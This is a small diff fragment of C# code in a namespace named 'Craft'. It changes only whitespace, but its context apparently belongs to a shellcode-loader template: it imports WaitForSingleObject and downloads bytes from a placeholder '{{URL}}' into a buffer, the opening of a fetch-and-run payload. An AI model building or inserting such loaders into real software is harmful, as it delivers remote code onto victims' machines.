@@ -24,7 +24,7 @@ namespace Craft
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
         public static void Main()
-        {
+        {            
             System.Net.WebClient client = new System.Net.WebClient();
             byte[] buf = client.DownloadData("{{URL}}");
 
